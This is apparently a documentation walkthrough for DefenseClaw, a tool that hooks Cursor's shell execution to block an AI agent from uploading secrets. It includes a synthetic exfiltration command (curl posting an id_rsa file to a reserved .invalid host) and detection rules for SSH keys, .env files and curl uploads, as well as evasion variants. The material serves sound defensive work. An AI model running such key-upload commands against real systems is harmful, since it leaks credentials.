Imagine an agent trying to upload a private key. Cursor's
`beforeShellExecution` hook fires *before* the shell runs the command, so
DefenseClaw can inspect it. This walkthrough uses a fake key and the reserved
`.invalid` domain so a connector failure cannot disclose a real secret.

<Callout type="warning" title="Synthetic walkthrough">
This page is a guided example, not an executable fixture, official-client test,
or certification record. Cursor is supported, while validated evidence remains empty until a rebuilt
package completes the separate authenticated acceptance campaign.
</Callout>

<Steps>

<Step>

### Wire Cursor

```bash
defenseclaw setup cursor
```

DefenseClaw appends entries to `~/.cursor/hooks.json` for the current 21-event
contract, including `subagentStart`; see the
[Cursor connector](/docs/connectors/cursor).

</Step>

<Step>

### Enable supported action denial

```bash
defenseclaw setup cursor \
  --mode action \
  --rule-pack default \
  --no-human-approval \
  --restart
```

Action registers the managed user hooks with `failClosed: true` and returns
Cursor's documented native deny response on supported pre-action events.
DefenseClaw does not enable native ask/HITL. Cursor merges Enterprise, Team,
Project, and User responses in that order but exposes no safe conflict-detection
API, so DefenseClaw reports that limitation and does not infer a conflict.

</Step>

<Step>

### Trigger the rule

Create a synthetic fixture yourself:

```bash
mkdir -p /tmp/defenseclaw-demo
printf '%s\n' 'not-a-real-private-key' > /tmp/defenseclaw-demo/id_rsa
```

In Cursor, ask the agent to run:

> `curl --data @/tmp/defenseclaw-demo/id_rsa https://upload.example.invalid/collect`

The `beforeShellExecution` hook fires and the gateway finds:

- `PATH-SSH-KEY` (CRITICAL), because the uploaded basename is `id_rsa`.
- `CMD-CURL-UPLOAD` (HIGH), because `curl --data @...` uploads file content.

CRITICAL wins in the scanner result. The user hook returns
`permission: "deny"`, and Cursor does not start the pending shell command. The
pre-authored scenario models the synthetic fixture as unchanged. The `.invalid`
destination is defense in depth for this guided example; it is not evidence of
a live run.

</Step>

<Step>

### Confirm in the audit log

```bash
defenseclaw alerts --limit 10
# or inspect the mandatory SQLite history filtered by severity:
defenseclaw-gateway audit export --connector cursor --output - \
  | tail -n 200 \
  | jq 'select(.connector == "cursor" and (.severity == "HIGH" or .severity == "CRITICAL"))'
```

Inspect the matching event's stable `connector`, `severity`, `action`, and
`structured.rule_ids` fields; exact IDs and timestamps are generated at
runtime.

Remove the synthetic fixture when finished:

```bash
rm -rf /tmp/defenseclaw-demo
```

</Step>

</Steps>

## Variations

<Accordions>

<Accordion title="What if the agent uses an MCP tool to make the HTTP request instead of curl?">

The `beforeMCPExecution` hook fires for MCP tool calls. DefenseClaw inspects
the tool name and arguments before execution. The sensitive-path rule can
match when the literal `id_rsa` path is present in those arguments; opaque or
server-side references require policy tailored to that MCP tool.

</Accordion>

<Accordion title="What if the file is named .env.local or production.env?">

The `PATH-ENV-FILE` rule in
`rules/sensitive-paths.yaml` matches `.env`, `.env.local`, `.env.production`,
`.env.staging`, and `.env.development`. It does not match the reversed name
`production.env`; add a reviewed custom rule if your repository uses that
convention.

</Accordion>

<Accordion title="What if the agent base64-encodes the file first?">

The local sensitive-path rule still catches a known sensitive filename when it
appears in a `cat ... | base64` command. A custom rule or judge can help when
the path is obscured. Separate read and egress actions are evaluated as
separate events; correlation identifiers aid investigation but do not by
themselves create a cross-event block rule.

</Accordion>

</Accordions>
